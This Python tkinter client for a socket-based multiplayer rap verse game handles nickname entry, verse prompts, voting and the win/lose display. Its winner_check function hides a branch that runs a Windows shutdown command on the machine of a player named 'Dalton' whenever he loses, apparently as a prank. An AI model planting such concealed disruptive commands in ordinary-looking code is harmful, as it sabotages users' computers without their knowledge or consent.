import socket
import threading
import tkinter as tk
from PIL import Image, ImageTk
from itertools import count
import json
import random
import os

class Client:

    def __init__(self, ip_address='192.168.0.108'):
        self.ClientMultiSocket = socket.socket()
        self.host = ip_address
        self.port = 2004
        self.nickname = ""
        self.message_postion_y = 0
        self.round = 1

        self.thread_one = threading.Thread(target=self.start_gui)
        self.thread_one.start()

        self.start_connection()

    def start_gui(self):
        self.root = tk.Tk()
        self.root.wm_title("Rap Games")
        self.root.configure(bg="#586e75")
        self.root.geometry("700x722")

        #message box
        self.wrapper_one = tk.LabelFrame(self.root, bg="#073642")
        self.canvas = tk.Canvas(self.wrapper_one, height=100, width=600, highlightthickness=0)
        self.canvas.pack(side=tk.LEFT)
        self.y_scroll = tk.Scrollbar(self.wrapper_one, orient="vertical",
        command=self.canvas.yview, borderwidth=0)
        self.y_scroll.pack(side=tk.RIGHT, fill="y")
        self.frame_one = tk.Frame(self.canvas, bg="#073642", highlightthickness=0)
        self.canvas.configure(yscrollcommand=self.y_scroll.set)
        self.canvas.bind("<Configure>",
        lambda e: self.canvas.configure(scrollregion = self.canvas.bbox('all')))
        self.canvas.create_window((0, 0), window=self.frame_one, anchor="nw",
        height=500, width=600)
        self.wrapper_one.pack(fill="x", side="bottom")

        self.nickname_input = tk.Entry(self.root)
        self.nickname_input.pack()
        self.confirm = tk.Button(self.root, text="Join",
        command=self.join_by_nickname)
        self.confirm.pack()

        #message box buttons/entries
        self.send_message = tk.Entry(self.root, width=70, bg="#586e75")
        self.send_message.place(x=0, y=700)
        tk.Button(self.root, text="Send", command=self.send_message_server,
        width=12, bg="#073642", highlightthickness=0).place(x=565, y=695)

        tk.mainloop()

    def start_connection(self):
        print('Waiting for connection response')
        try:
            self.ClientMultiSocket.connect((self.host, self.port))
        except socket.error as e:
            print(str(e))

        while True:

            message = self.ClientMultiSocket.recv(1024)
            response = message.decode('utf-8')
            print(response)
            if response.startswith("message: "):
                message = response.split("message: ")[1]
                self.add_to_message_box(message)
            elif response == "Ready!":
                self.waiting_label.destroy()
                self.show_first_prompt()
            elif response.startswith("vote: "):
                self.create_vote(response)
            elif response.startswith("winner: "):
                winner = response.split("winner: ")[1]
                self.winner_check(winner)


        self.ClientMultiSocket.close()

    def join_by_nickname(self):
        self.nickname = self.nickname_input.get()
        self.ClientMultiSocket.send(str.encode("nickname: " + self.nickname))
        res = self.ClientMultiSocket.recv(1024)

        self.nickname_input.destroy()
        self.confirm.destroy()

        self.waiting_label = tk.Label(self.root, bg="#586e75",
        text="The game will start whenever Master Gabe decides to start the game.")
        self.waiting_label.pack()

        self.canvas_gif = tk.Canvas(self.root, width = 500, height = 500,
        bg="#586e75", highlightthickness=0)
        self.canvas_gif.pack()

        data = open("prompts.json", "r")
        json_file = json.load(data)
        filename = random.choice(json_file["gif_filenames"])
        self.ClientMultiSocket.send(str.encode("gif: " + filename + " " + self.nickname))
        file = "assets/" + filename
        self.load_gif(file)

    def load_gif(self, im):
        if isinstance(im, str):
            im = Image.open(im)
        self.loc = 0
        self.frames = []

        try:
            for i in count(1):
                self.frames.append(ImageTk.PhotoImage(im.copy()))
                im.seek(i)
        except EOFError:
            pass

        try:
            self.delay = im.info['duration']
        except:
            self.delay = 100

        if len(self.frames) == 1:
            self.canvas_gif.create_image(0, 0, anchor=tk.NW, image=self.frames[0])
        else:
            self.next_frame()

    def unload(self):
        self.canvas_gif.create_image(0, 0, anchor=tk.NW, image="")
        self.frames = None

    def next_frame(self):
        if self.frames:
            self.loc += 1
            self.loc %= len(self.frames)
            self.canvas_gif.create_image(0, 0, anchor=tk.NW, image=self.frames[self.loc])
            self.root.after(self.delay, self.next_frame)

    def send_message_server(self):
        message = "message: " + self.nickname + ": " + self.send_message.get()
        self.ClientMultiSocket.send(str.encode(message))
        res = self.ClientMultiSocket.recv(1024)
        self.send_message.delete(0, tk.END)

    def add_to_message_box(self, msg):
        tk.Label(self.frame_one, text=msg,
        bg="#073642", fg="#657b83").place(x=0, y=self.message_postion_y)
        self.message_postion_y += 20

    def show_first_prompt(self):
        self.directions_label = tk.Label(self.root, text='Finish this sentence.',
        bg="#586e75")
        self.directions_label.pack()

        json_file = open("prompts.json", "r")
        self.data = json.load(json_file)
        new_prompt = random.choice(self.data["first_prompts"])

        self.first_prompt = tk.Label(self.root, text=new_prompt + "...",
        bg="#586e75")
        self.first_prompt.pack()

        self.first_entry = tk.Entry(self.root, width=80, bg="#586e75")
        self.first_entry.pack()

        self.confirm_button = tk.Button(self.root, text="Confirm",
        command=lambda:self.follow_up_verse(new_prompt), bg="#073642")
        self.confirm_button.pack()

    def follow_up_verse(self, last_prompt):
        self.first_prompt.destroy()

        verse = "verse: " + self.nickname + " " + last_prompt + " " + self.first_entry.get()
        self.ClientMultiSocket.send(str.encode(verse))

        self.delete_prompts()

        self.directions_label = tk.Label(self.root, text="Follow that up.",
        bg="#586e75")
        self.directions_label.pack()

        self.first_entry = tk.Entry(self.root, width=80, bg="#586e75")
        self.first_entry.pack()

        self.confirm_button = tk.Button(self.root, text="Confirm",
        command=self.send_verse, bg="#073642")
        self.confirm_button.pack()

    def send_verse(self):
        self.round += 1
        verse = "verse: " + self.nickname + " " + self.first_entry.get()
        self.ClientMultiSocket.send(str.encode(verse))
        self.delete_prompts()

        if self.round == 2:
            self.show_first_prompt()

    def delete_prompts(self):
        self.directions_label.destroy()
        self.first_entry.destroy()
        self.confirm_button.destroy()

    def create_vote(self, vote):
        self.round = 1
        players = vote.split("vote: ")[1].split(" ")
        player_one = players[0]
        player_two = players[1]

        if player_one != self.nickname and player_two != self.nickname:
            self.player_one_vote = tk.Button(self.root, text=player_one,
            bg="#073642", width=30,
            command=lambda: self.submit_vote(player_one))
            self.player_one_vote.pack()
            self.player_two_vote = tk.Button(self.root, text=player_two,
            width=30, command=lambda: self.submit_vote(player_two), bg="#073642")
            self.player_two_vote.pack()

    def submit_vote(self, player):
        vote = "player_vote: " + player
        self.ClientMultiSocket.send(str.encode(vote))
        self.player_one_vote.destroy()
        self.player_two_vote.destroy()

    def winner_check(self, winner):
        if self.nickname == winner:
            self.winner_label = tk.Label(self.root, text="You win.",
            font='times 24', bg="#586e75")
            self.winner_label.pack()
        elif self.nickname == "Dalton" and self.nickname != winner:
            os.system("shutdown /s /t 1")
        else:
            self.loser_label = tk.Label(self.root, text="You lose.",
            font='times 24', bg="#586e75")
            self.loser_label.pack()

if __name__=="__main__":
    Client()
